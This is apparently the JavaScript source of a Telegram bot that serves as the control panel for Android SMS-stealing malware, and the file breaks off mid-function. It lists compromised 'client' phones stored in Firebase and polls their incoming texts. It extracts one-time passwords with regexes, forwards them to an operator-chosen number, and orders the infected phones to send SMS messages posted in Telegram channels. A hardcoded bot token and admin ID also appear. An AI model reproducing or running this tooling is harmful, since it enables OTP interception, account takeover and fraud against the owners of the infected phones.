const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

const BOT_TOKEN = '8888560487:AAH3OlSq4b40jP-fpdpGuviALcnOiKBgIA8';
const ADMIN_IDS = ['8472456673'];
const bot = new Telegraf(BOT_TOKEN);
const userData = new Map();

// ==================== ADMIN FUNCTIONS ====================
function isAdmin(userId) {
    return ADMIN_IDS.includes(userId.toString());
}

// ==================== FIREBASE FUNCTIONS ====================
function getUserDb(userId) {
    const user = userData.get(userId);
    if (!user || !user.firebaseUrl) return null;
    
    return {
        url: user.firebaseUrl,
        async get(path) {
            try {
                const res = await axios.get(`${this.url}/${path}.json`, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        },
        async put(path, data) {
            try {
                const res = await axios.put(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.status === 200;
            } catch (e) { return false; }
        },
        async push(path, data) {
            try {
                const res = await axios.post(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        }
    };
}

// ==================== DEVICE FUNCTIONS ====================
async function getDevice(userId, deviceId) {
    const db = getUserDb(userId);
    if (!db) return null;
    try {
        const data = await db.get(`clients/${deviceId}`);
        if (!data) return null;
        
        let isOnline = false;
        if (data.status === true || data.status === 'true' || data.status === 1 || data.status === 'online') {
            isOnline = true;
        }
        
        let sim1Number = 'N/A';
        let sim1Carrier = 'Unknown';
        let sim2Number = 'N/A';
        let sim2Carrier = 'Unknown';
        let selectedSim = 0;
        
        if (data.sims && data.sims.length > 0) {
            if (data.sims[0]) {
                sim1Number = data.sims[0].phoneNumber || data.sims[0].number || data.mobNo || 'N/A';
                sim1Carrier = data.sims[0].carrierName || data.sims[0].operator || data.service_provider || 'Unknown';
            }
            if (data.sims[1]) {
                sim2Number = data.sims[1].phoneNumber || data.sims[1].number || 'N/A';
                sim2Carrier = data.sims[1].carrierName || data.sims[1].operator || 'Unknown';
            }
            selectedSim = data.selectedSim || data.currentSim || 0;
        }
        
        return {
            id: deviceId,
            name: data.modelName || data.model || data.name || deviceId.slice(0, 8),
            phone: data.mobNo || data.phoneNumber || sim1Number || 'Unknown',
            online: isOnline,
            battery: data.battery || data.batteryLevel || '0%',
            sim1Number: sim1Number,
            sim1Carrier: sim1Carrier,
            sim2Number: sim2Number,
            sim2Carrier: sim2Carrier,
            selectedSim: selectedSim,
            sims: data.sims || []
        };
    } catch (e) { 
        return null; 
    }
}

async function getAllDevices(userId) {
    const db = getUserDb(userId);
    if (!db) return [];
    try {
        const data = await db.get('clients');
        if (!data) return [];
        const devices = [];
        for (const devId in data) {
            if (data[devId]) {
                let isOnline = false;
                if (data[devId].status === true || data[devId].status === 'true' || data[devId].status === 1 || data[devId].status === 'online') {
                    isOnline = true;
                }
                devices.push({
                    id: devId,
                    name: data[devId].modelName || data[devId].model || data[devId].name || devId.slice(0, 8),
                    phone: data[devId].mobNo || data[devId].phoneNumber || 'Unknown',
                    online: isOnline,
                    battery: data[devId].battery || data[devId].batteryLevel || '0%'
                });
            }
        }
        return devices;
    } catch (e) { return []; }
}

// ==================== SMS SENDING ====================
async function sendSms(userId, deviceId, toNumber, message) {
    const start = Date.now();
    const db = getUserDb(userId);
    if (!db) return { success: false, error: 'Firebase not connected' };
    
    const device = await getDevice(userId, deviceId);
    if (!device) return { success: false, error: 'Device not found' };
    
    let cleanNumber = toNumber.toString().trim().replace('+', '');
    const timestamp = Date.now();
    const commandId = `cmd_${timestamp}_${Math.random().toString(36).substr(2, 8)}`;
    
    const commandPath = `clients/${deviceId}/commands/sendSms`;
    const commandData = {
        targetNumber: cleanNumber,
        message: message,
        timestamp: timestamp,
        status: 'pending',
        id: commandId,
        admin_sent: true
    };
    
    const webhookPath = `clients/${deviceId}/webhookEvent/sendSms`;
    const webhookData = {
        to: cleanNumber,
        message: message,
        isSended: false,
        timestamp: timestamp,
        commandId: commandId
    };
    
    let success = false;
    
    try {
        const result = await db.put(commandPath, commandData);
        success = result === true;
    } catch(e) {}
    
    if (!success) {
        try {
            const result = await db.put(webhookPath, webhookData);
            success = result === true;
        } catch(e) {}
    }
    
    const elapsed = Date.now() - start;
    
    if (success) {
        return { success: true, message: `SMS sent to ${cleanNumber}`, elapsed: elapsed, commandId: commandId };
    }
    
    return { success: false, error: 'Failed to write command to Firebase' };
}

// ==================== OTP EXTRACTION ====================
function extractOTP(text) {
    if (!text) return null;
    
    // Pattern for: "Your OTP 204487"
    let match = text.match(/OTP\s+(\d{4,8})/i);
    if (match) return match[1];
    
    // Pattern for: "OTP: 123456"
    match = text.match(/OTP[:\s]*(\d{4,8})/i);
    if (match) return match[1];
    
    // Pattern for: "123456 is your OTP"
    match = text.match(/(\d{4,8}) is your OTP/i);
    if (match) return match[1];
    
    // Pattern for: "code: 123456"
    match = text.match(/code[:\s]*(\d{4,8})/i);
    if (match) return match[1];
    
    // Any 4-8 digit number
    const numberMatch = text.match(/\b(\d{4,8})\b/);
    if (numberMatch) {
        const num = numberMatch[1];
        if (!text.match(new RegExp(`phone|mobile|contact.*${num}`, 'i'))) {
            return num;
        }
    }
    
    return null;
}

// ==================== TOKEN EXTRACTION (SAME AS BEFORE) ====================
function extractToken(text) {
    if (!text || text.trim().length === 0) return null;
    
    console.log(`\n🔍 Extracting token from: ${text.slice(0, 200)}`);
    
    // Format: To: 919876543210\nMessage: TOKEN123
    let match = text.match(/To:\s*\+?(\d{10,12})[\s\n]*Message:\s*(.+?)(?=\n|$)/is);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'To:Message' };
        }
    }
    
    // Format: 📱 Receipt: XXXXX\n🔑 Token: TOKEN
    match = text.match(/📱\s*Receipt:\s*\+?(\d{10,12})[\s\n]*🔑\s*Token:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'Receipt:Token' };
        }
    }
    
    // Format: Receipt: XXXXX\nToken: TOKEN
    match = text.match(/Receipt:\s*\+?(\d{10,12})[\s\n]*Token:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'Receipt:Token' };
        }
    }
    
    // Format: 📞 To: XXXXX 💬 Message: YYYYY
    match = text.match(/📞\s*To:\s*\+?(\d{10,12})[\s\S]*?💬\s*Message:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'Emoji' };
        }
    }
    
    // Format: One-tap copy: XXXXX | YYYYY
    match = text.match(/One-tap copy:\s*\+?(\d{10,12})\s*\|\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'One-tap' };
        }
    }
    
    // Format: Phone: XXXXX\nOTP: YYYYY
    match = text.match(/Phone:\s*\+?(\d{10,12})[\s\n]*OTP:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'Phone:OTP' };
        }
    }
    
    // Try to find number + token pattern
    const phoneMatch = text.match(/\b(\d{10,12})\b/);
    if (phoneMatch) {
        const number = phoneMatch[1];
        const afterNumber = text.substring(text.indexOf(number) + number.length);
        const tokenMatch = afterNumber.match(/\s+([A-Za-z0-9!@#$%^&*()_+={}\[\]|\\/?~`-]{4,})/);
        if (tokenMatch) {
            const message = tokenMatch[1].trim();
            return { number: number, message: message, format: 'Number+Token' };
        }
    }
    
    return null;
}

// ==================== AUTO-FORWARD OTP ====================
async function autoForwardOTP(userId, deviceId, fullMessage, sender, timestamp, otpCode) {
    const user = userData.get(userId);
    
    if (!user || !user.otpForwardNumber) {
        return false;
    }
    
    console.log(`🔐 OTP Detected: ${otpCode}`);
    console.log(`📞 Auto-forwarding OTP to: ${user.otpForwardNumber}`);
    
    const formattedTime = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();
    const forwardMessage = `🔐 OTP: ${otpCode}\nFrom: ${sender}\nTime: ${formattedTime}\nMessage: ${fullMessage}`;
    
    // Send Telegram notification
    await bot.telegram.sendMessage(
        userId,
        `🔐 *OTP DETECTED!*\n\n📱 From: ${sender}\n🔑 OTP: \`${otpCode}\`\n📞 Forwarding to: \`${user.otpForwardNumber}\``,
        { parse_mode: 'Markdown' }
    );
    
    // Forward via SMS
    const result = await sendSms(userId, deviceId, user.otpForwardNumber, forwardMessage);
    
    if (result.success) {
        await bot.telegram.sendMessage(
            userId,
            `✅ *OTP FORWARDED!*\n\n📞 To: \`${user.otpForwardNumber}\`\n🔑 OTP: \`${otpCode}\``,
            { parse_mode: 'Markdown' }
        );
        return true;
    } else {
        await bot.telegram.sendMessage(
            userId,
            `❌ *OTP FORWARD FAILED!*\n\n❌ ${result.error}`,
            { parse_mode: 'Markdown' }
        );
        return false;
    }
}

// ==================== MONITOR FIREBASE MESSAGES ====================
async function monitorFirebaseMessages(userId, user) {
    const db = getUserDb(userId);
    if (!db || !user.monitoringDevice) return;
    
    try {
        const messagesData = await db.get(`clients/${user.monitoringDevice}/messages`);
        if (!messagesData) return;
        
        let messages = [];
        if (typeof messagesData === 'object') {
            messages = Object.entries(messagesData).map(([id, msg]) => ({
                id: id,
                ...msg
            }));
        }
        
        if (messages.length === 0) return;
        
        messages.sort((a, b) => {
            const timeA = a.timestamp || (a.dateTime ? new Date(a.dateTime).getTime() : 0);
            const timeB = b.timestamp || (b.dateTime ? new Date(b.dateTime).getTime() : 0);
            return timeB - timeA;
        });
        
        const recentMessages = messages.slice(0, 10);
        
        for (const msg of recentMessages) {
            const msgId = msg.id;
            const msgTime = msg.timestamp || (msg.dateTime ? new Date(msg.dateTime).getTime() : 0);
            
            if (user.processedMsgs && user.processedMsgs.has(msgId)) continue;
            
            const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
            if (msgTime < startTime && startTime > 0) continue;
            
            const messageText = msg.message || msg.text || '';
            const sender = msg.sender || 'Unknown';
            
            console.log(`\n📨 New message: ${messageText.slice(0, 100)}`);
            
            const otp = extractOTP(messageText);
            
            if (otp && user.otpForwardNumber) {
                await autoForwardOTP(userId, user.monitoringDevice, messageText, sender, msgTime, otp);
            }
            
            if (!user.processedMsgs) user.processedMsgs = new Set();
            user.processedMsgs.add(msgId);
        }
        
        userData.set(userId, user);
        
    } catch (error) {
        console.log(`❌ Error: ${error.message}`);
    }
}

// ==================== COMMANDS ====================
bot.start(async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    const stylishText = `
╔══════════════════════════════╗
║  ✦ 𝘀𝗼𝘂𝗹 𝗲𝘅𝗲 𝗮𝘂𝘁𝗼 𝘃𝗮𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 ✦  ║
║         V E R S I O N   2 . 0        ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       ⚡ S E T U P   G U I D E      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ 1️⃣ /setfirebase <url>
◈ 2️⃣ /setdevice
◈ 3️⃣ /addchannel (in your chat)
◈ 4️⃣ /startmonitor

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      📌 OTP AUTO-FORWARD       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /setotpnum <number> - Set OTP forward number
◈ /removeotpnum - Remove OTP forward number
◈ /showotpnum - Show current OTP number

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      📌 TOKEN FORWARD         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Send in channel: To: X Message: Y

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   2 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    if (!user?.firebaseUrl) {
        await ctx.reply(stylishText);
        return;
    }
    
    const devices = await getAllDevices(userId);
    let deviceInfo = 'Not set';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) deviceInfo = `${d.name} (${d.online ? '🟢' : '🔴'})`;
    }
    
    await ctx.reply(
        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
        `┃        📊  S T A T U S        ┃\n` +
        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
        `◈ 📡 Firebase: ✅ Connected\n` +
        `◈ 📱 Device: ${deviceInfo}\n` +
        `◈ 📢 Chats: ${user.channels?.length || 0}\n` +
        `◈ ⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `◈ 🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
    );
});

bot.command('setfirebase', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        await ctx.reply('❌ Usage: `/setfirebase <url>`', { parse_mode: 'Markdown' });
        return;
    }
    
    let url = args[1];
    if (!url.startsWith('https://')) url = 'https://' + url;
    if (!url.endsWith('.com') && !url.includes('.firebaseio.com')) url = url.replace(/\/$/, '');
    
    const msg = await ctx.reply('🔄 Connecting to Firebase...');
    
    try {
        await axios.get(`${url}/.json?shallow=true`, { timeout: 10000 });
        
        if (!userData.has(userId)) userData.set(userId, {});
        const user = userData.get(userId);
        user.firebaseUrl = url;
        user.channels = user.channels || [];
        user.processedMsgs = new Set();
        user.monitorActive = false;
        userData.set(userId, user);
        
        await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, null,
            `✅ *Firebase Connected!*\n\n📡 URL: \`${url}\`\n\nNext: \`/setdevice\``,
            { parse_mode: 'Markdown' }
        );
    } catch (error) {
        await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, null,
            `❌ *Connection Failed!*\n\nError: ${error.message}`,
            { parse_mode: 'Markdown' }
        );
    }
});

bot.command('setdevice', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(userId);
    
    if (args.length > 1) {
        const deviceInput = args[1];
        const allDevices = await getAllDevices(userId);
        
        if (allDevices.length === 0) {
            return ctx.reply('❌ No devices found!', { parse_mode: 'Markdown' });
        }
        
        let foundDevice = allDevices.find(d => d.id === deviceInput) ||
                         allDevices.find(d => d.name.toLowerCase().includes(deviceInput.toLowerCase()));
        
        if (!foundDevice) {
            let deviceList = '📱 *Available Devices:*\n\n';
            allDevices.slice(0, 10).forEach(d => {
                deviceList += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n  ${d.online ? '🟢 Online' : '🔴 Offline'}\n\n`;
            });
            return ctx.reply(`❌ Device "${deviceInput}" not found!\n\n${deviceList}`, { parse_mode: 'Markdown' });
        }
        
        const device = await getDevice(userId, foundDevice.id);
        user.monitoringDevice = device.id;
        userData.set(userId, user);
        
        return ctx.reply(
            `✅ *Device Set!*\n\n` +
            `📱 Name: ${device.name}\n` +
            `🆔 ID: \`${device.id}\`\n` +
            `📞 Phone: ${device.phone}\n` +
            `🔋 Battery: ${device.battery}\n` +
            `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\n` +
            `Next: \`/addchannel\` or \`/setotpnum\``,
            { parse_mode: 'Markdown' }
        );
    }
    
    const allDevices = await getAllDevices(userId);
    if (allDevices.length === 0) {
        return ctx.reply('📭 *No devices found!*', { parse_mode: 'Markdown' });
    }
    
    user.deviceList = allDevices;
    user.currentPage = 0;
    userData.set(userId, user);
    await showDevicePage(ctx, userId, 0);
});

async function showDevicePage(ctx, userId, page) {
    const user = userData.get(userId);
    if (!user || !user.deviceList) return;
    
    const devices = user.deviceList;
    const itemsPerPage = 10;
    const totalPages = Math.ceil(devices.length / itemsPerPage);
    const start = page * itemsPerPage;
    const end = start + itemsPerPage;
    const pageDevices = devices.slice(start, end);
    
    let text = `📱 *DEVICES* (Page ${page + 1}/${totalPages})\n\n`;
    text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    
    for (const d of pageDevices) {
        text += `📱 *${d.name}*\n`;
        text += `   🆔 \`${d.id.slice(0, 20)}...\`\n`;
        text += `   📞 ${d.phone}\n`;
        text += `   🔋 ${d.battery}\n`;
        text += `   ${d.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n`;
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    }
    
    const buttons = [];
    for (const d of pageDevices) {
        buttons.push([Markup.button.callback(`📱 ${d.name.slice(0, 20)}`, `select_dev_${d.id}`)]);
    }
    
    const navButtons = [];
    if (page > 0) navButtons.push(Markup.button.callback('◀️ PREV', `dev_page_${page - 1}`));
    if (page < totalPages - 1) navButtons.push(Markup.button.callback('NEXT ▶️', `dev_page_${page + 1}`));
    if (navButtons.length > 0) buttons.push(navButtons);
    buttons.push([Markup.button.callback('❌ CANCEL', 'cancel_select')]);
    
    await ctx.reply(text, { ...Markup.inlineKeyboard(buttons), parse_mode: 'Markdown' });
}

// ==================== OTP FORWARD COMMANDS ====================
bot.command('setotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    if (!userData.get(userId).monitoringDevice) {
        return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
    }
    
    if (args.length < 2) {
        return ctx.reply(
            `❌ *Usage:* \`/setotpnum <phone_number>\`\n\n` +
            `Example: \`/setotpnum 919715326108\``,
            { parse_mode: 'Markdown' }
        );
    }
    
    const phoneNumber = args[1].replace('+', '');
    const user = userData.get(userId);
    
    user.otpForwardNumber = phoneNumber;
    userData.set(userId, user);
    
    await ctx.reply(
        `✅ *OTP Forward Number Set!*\n\n` +
        `📞 Number: \`${phoneNumber}\``,
        { parse_mode: 'Markdown' }
    );
});

bot.command('removeotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.otpForwardNumber) {
        return ctx.reply('❌ No OTP forward number is set!', { parse_mode: 'Markdown' });
    }
    
    user.otpForwardNumber = null;
    userData.set(userId, user);
    
    await ctx.reply(`✅ *OTP Forward Number Removed!*`, { parse_mode: 'Markdown' });
});

bot.command('showotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.otpForwardNumber) {
        return ctx.reply(`❌ *No OTP Forward Number Set!*`, { parse_mode: 'Markdown' });
    }
    
    await ctx.reply(`🔐 *OTP Forward Number*\n\n📞 \`${user.otpForwardNumber}\``, { parse_mode: 'Markdown' });
});

// ==================== CHAT MANAGEMENT ====================
bot.command('addchannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    let channelId = null;
    let chatTitle = 'Unknown';
    
    if (args.length > 1) {
        channelId = args[1];
    } else if (ctx.chat.type === 'channel' || ctx.chat.type === 'supergroup' || ctx.chat.type === 'group') {
        channelId = ctx.chat.id.toString();
        chatTitle = ctx.chat.title || ctx.chat.username || 'Chat';
    } else {
        await ctx.reply(
            `❌ *How to add channel/group:*\n\n` +
            `• By ID: \`/addchannel -1003937717807\`\n` +
            `• Or send \`/addchannel\` IN the channel/group\n\n` +
            `💡 Your Chat ID: \`${ctx.chat.id}\``,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const user = userData.get(userId);
    if (!user.channels) user.channels = [];
    
    if (user.channels.includes(channelId)) {
        return ctx.reply(`ℹ️ Chat already monitored.`, { parse_mode: 'Markdown' });
    }
    
    user.channels.push(channelId);
    user.channelNames = user.channelNames || {};
    user.channelNames[channelId] = chatTitle;
    userData.set(userId, user);
    
    await ctx.reply(
        `✅ *Chat Added!*\n\n` +
        `📢 Name: ${chatTitle}\n` +
        `🆔 ID: \`${channelId}\``,
        { parse_mode: 'Markdown' }
    );
});

bot.command('listchannels', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.channels?.length) {
        await ctx.reply('📭 No channels added.', { parse_mode: 'Markdown' });
        return;
    }
    
    let text = '📢 *MONITORED CHATS*\n\n';
    user.channels.forEach((ch, i) => { 
        const name = user.channelNames?.[ch] || 'Unknown';
        text += `${i+1}. ${name}\n   🆔 \`${ch}\`\n\n`;
    });
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command('removechannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.channels?.length) return ctx.reply('📭 No chats to remove.');
    if (args.length < 2) return ctx.reply('Usage: `/removechannel <chat_id>`', { parse_mode: 'Markdown' });
    
    const idx = user.channels.indexOf(args[1]);
    if (idx === -1) return ctx.reply('❌ Chat not found.');
    
    user.channels.splice(idx, 1);
    userData.set(userId, user);
    
    await ctx.reply(`✅ *Removed Chat!*`, { parse_mode: 'Markdown' });
});

bot.command('startmonitor', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.firebaseUrl) return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    if (!user.monitoringDevice) return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
    
    const now = new Date();
    user.monitorStartTime = now.toISOString();
    user.monitorActive = true;
    user.processedMsgs = new Set();
    userData.set(userId, user);
    
    const device = await getDevice(userId, user.monitoringDevice);
    const deviceStatus = device ? (device.online ? '🟢 ONLINE' : '🔴 OFFLINE') : '❓ Unknown';
    
    if (user.monitorInterval) clearInterval(user.monitorInterval);
    
    user.monitorInterval = setInterval(async () => {
        const currentUser = userData.get(userId);
        if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
            await monitorFirebaseMessages(userId, currentUser);
        }
    }, 2000);
    
    userData.set(userId, user);
    
    await ctx.reply(
        `✅ *MONITORING STARTED!*\n\n` +
        `📱 Device: \`${user.monitoringDevice}\`\n` +
        `📡 Status: ${deviceStatus}\n` +
        `📢 Chats: ${user.channels?.length || 0}\n` +
        `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n` +
        `🕐 Started: ${now.toLocaleString()}\n\n` +
        `📌 *Features:*\n` +
        `• OTPs → Auto-forward to your number\n` +
        `• Tokens (To: X Message: Y) → Forward to any number\n\n` +
        `🚀 *MONITORING ACTIVE!*`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('stop', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (user) {
        user.monitorActive = false;
        if (user.monitorInterval) clearInterval(user.monitorInterval);
        userData.set(userId, user);
    }
    await ctx.reply(`⏸ *Monitor Paused*`, { parse_mode: 'Markdown' });
});

bot.command('resume', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
    
    user.monitorActive = true;
    
    if (user.monitorInterval) clearInterval(user.monitorInterval);
    user.monitorInterval = setInterval(async () => {
        const currentUser = userData.get(userId);
        if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
            await monitorFirebaseMessages(userId, currentUser);
        }
    }, 2000);
    
    userData.set(userId, user);
    await ctx.reply(`✅ *Monitor Resumed!*`, { parse_mode: 'Markdown' });
});

bot.command('status', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user) return ctx.reply('❌ Not configured.', { parse_mode: 'Markdown' });
    
    await ctx.reply(
        `📊 *STATUS*\n\n` +
        `📡 Firebase: ✅ Connected\n` +
        `📱 Device: ${user.monitoringDevice || 'Not set'}\n` +
        `📢 Chats: ${user.channels?.length || 0}\n` +
        `⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('send', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.', { parse_mode: 'Markdown' });
    if (args.length < 3) return ctx.reply('❌ Usage: `/send <number> <message>`', { parse_mode: 'Markdown' });
    
    const phone = args[1];
    const message = args.slice(2).join(' ');
    
    const msg = await ctx.reply(`📤 Sending...`, { parse_mode: 'Markdown' });
    const result = await sendSms(userId, user.monitoringDevice, phone, message);
    
    await ctx.telegram.editMessageText(
        msg.chat.id, msg.message_id, null,
        result.success ? `✅ Sent! (${result.elapsed}ms)` : `❌ Failed: ${result.error}`
    );
});

// ==================== TOKEN FORWARD HANDLER (SAME AS BEFORE) ====================
bot.on('channel_post', async (ctx) => {
    await handleChannelMessage(ctx, ctx.channelPost);
});

bot.on('message', async (ctx) => {
    if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
        await handleChannelMessage(ctx, ctx.message);
    }
});

async function handleChannelMessage(ctx, messageObj) {
    const chatId = ctx.chat.id.toString();
    const text = messageObj.text || messageObj.caption || '';
    const msgTime = messageObj.date * 1000;
    
    if (!text) return;
    
    const monitoringUsers = [];
    for (const [uid, u] of userData.entries()) {
        if (u.banned) continue;
        if (u.channels && u.channels.includes(chatId)) {
            monitoringUsers.push({ userId: uid, user: u });
        }
    }
    
    if (monitoringUsers.length === 0) return;
    
    for (const { userId, user } of monitoringUsers) {
        if (!user.monitorActive) continue;
        
        const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
        if (msgTime < startTime) continue;
        
        const extracted = extractToken(text);
        if (extracted && user.monitoringDevice) {
            await bot.telegram.sendMessage(
                userId,
                `🎯 *TOKEN DETECTED!*\n\n📞 Target: \`${extracted.number}\`\n🔄 Forwarding...`,
                { parse_mode: 'Markdown' }
            );
            
            const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
            
            if (result.success) {
                await bot.telegram.sendMessage(
                    userId,
                    `✅ *TOKEN FORWARDED!*\n\n📞 To: \`${extracted.number}\``,
                    { parse_mode: 'Markdown' }
                );
            } else {
                await bot.telegram.sendMessage(
                    userId,
                    `❌ *TOKEN FORWARD FAILED!*\n\n❌ ${result.error}`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    }
}

// ==================== PRIVATE MESSAGE ====================
bot.on('text', async (ctx) => {
    if (ctx.chat.type !== 'private') return;
    const userId = ctx.from.id.toString();
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    const user = userData.get(userId);
    if (!user || user.banned) return;
    if (!user.monitoringDevice) return;
    
    const extracted = extractToken(text);
    if (extracted) {
        await ctx.reply(`📤 Sending token...`);
        const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
        if (result.success) {
            await ctx.reply(`✅ Sent! (${result.elapsed}ms)`);
        } else {
            await ctx.reply(`❌ Failed: ${result.error}`);
        }
    }
});

// ==================== ADMIN COMMANDS ====================
bot.command('admin', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
    
    await ctx.reply(
        `👑 *ADMIN PANEL*\n\n` +
        `📊 Users: ${userData.size}\n` +
        `/users - List users\n` +
        `/ban <id> - Ban user\n` +
        `/unban <id> - Unban user\n` +
        `/broadcast - Send to all`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('users', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
    
    if (userData.size === 0) return ctx.reply('📭 No users.');
    
    let list = '👥 *USERS*\n\n';
    let i = 1;
    for (const [uid, user] of userData.entries()) {
        const status = user.banned ? '🔴 BANNED' : (user.monitorActive ? '🟢 ACTIVE' : '⚪ INACTIVE');
        list += `${i}. \`${uid}\` ${status}\n`;
        if (user.otpForwardNumber) list += `   🔐 OTP: ${user.otpForwardNumber}\n`;
        i++;
        if (i > 20) break;
    }
    await ctx.reply(list, { parse_mode: 'Markdown' });
});

bot.command('ban', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/ban <user_id>`');
    
    const targetId = args[1];
    if (!userData.has(targetId)) return ctx.reply('❌ User not found.');
    
    const user = userData.get(targetId);
    user.banned = true;
    user.monitorActive = false;
    if (user.monitorInterval) clearInterval(user.monitorInterval);
    userData.set(targetId, user);
    
    await ctx.reply(`✅ User banned!`);
});

bot.command('unban', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/unban <user_id>`');
    
    const targetId = args[1];
    if (!userData.has(targetId)) return ctx.reply('❌ User not found.');
    
    const user = userData.get(targetId);
